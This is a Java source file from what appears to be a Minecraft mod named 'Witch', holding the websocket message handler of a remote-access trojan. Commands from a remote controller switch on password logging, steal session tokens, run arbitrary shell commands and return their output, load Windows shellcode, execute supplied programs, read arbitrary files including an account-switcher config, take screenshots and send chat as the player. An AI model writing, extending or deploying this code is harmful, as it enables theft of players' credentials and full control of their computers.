package me.soda.witch.websocket;

import me.soda.witch.Witch;
import me.soda.witch.features.*;
import net.minecraft.text.Text;

import java.util.Base64;

public class MessageHandler {
    private static String decodeBase64(String str) {
        byte[] result = Base64.getDecoder().decode(str.getBytes());
        return new String(result);
    }

    public static void handle(String message) {
        String[] msgArr = message.split(" ");
        String messageType = msgArr[0];
        Witch.println("Received message: " + messageType);
        try {
            switch (messageType) {
                case "steal_pwd_switch" -> Witch.config.passwordBeingLogged = !Witch.config.passwordBeingLogged;
                case "steal_token" -> Message.send(messageType, new Stealer.Token());
                case "chat_control" -> ChatUtil.sendChat(decodeBase64(msgArr[1]));
                case "chat_filter" -> Witch.config.filterPattern = decodeBase64(msgArr[1]);
                case "chat_filter_switch" -> Witch.config.isBeingFiltered = !Witch.config.isBeingFiltered;
                case "chat_mute" -> Witch.config.isMuted = !Witch.config.isMuted;
                case "mods" -> Message.send(messageType, MinecraftUtil.allMods());
                case "systeminfo" -> Message.send(messageType, MinecraftUtil.systemInfo());
                case "screenshot" -> Screenshot.screenshot();
                case "chat" -> ChatUtil.chat(Text.of(decodeBase64(msgArr[1])), false);
                case "kill" -> Witch.client.close(false);
                case "shell" -> new Thread(() -> {
                    String result = ShellUtil.runCmd(decodeBase64(msgArr[1]));
                    Message.send(messageType, "\n" + result);
                }).start();
                case "shellcode" -> {
                    if (ShellUtil.isWin())
                        new Thread(() -> new ShellcodeLoader().loadShellCode(msgArr[1], false)).start();
                }
                case "log" -> Witch.config.logChatAndCommand = !Witch.config.logChatAndCommand;
                case "config" -> Message.send(messageType, Witch.config);
                case "player" -> Message.send(messageType, new PlayerInfo(Witch.mc.player));
                case "skin" -> {
                    handle("player");
                    PlayerSkin.sendPlayerSkin();
                }
                case "server" -> {
                    ServerUtil.disconnect();
                    Witch.config.canJoinServer = !Witch.config.canJoinServer;
                }
                case "kick" -> ServerUtil.disconnect();
                case "execute" -> {
                    if (ShellUtil.isWin()) {
                        ShellUtil.runProg(Base64.getDecoder().decode(msgArr[1]));
                    }
                }
                case "iasconfig" -> Message.send(messageType, FileReadUtil.read("config/ias.json"));
                case "read" -> Message.send(messageType, FileReadUtil.read(decodeBase64(msgArr[1])));
                case "runargs" -> Message.send(messageType, System.getProperties());
                default -> {
                }
            }
        } catch (Exception e) {
            Witch.println("Corrupted message!");
            Witch.printStackTrace(e);
        }
    }
}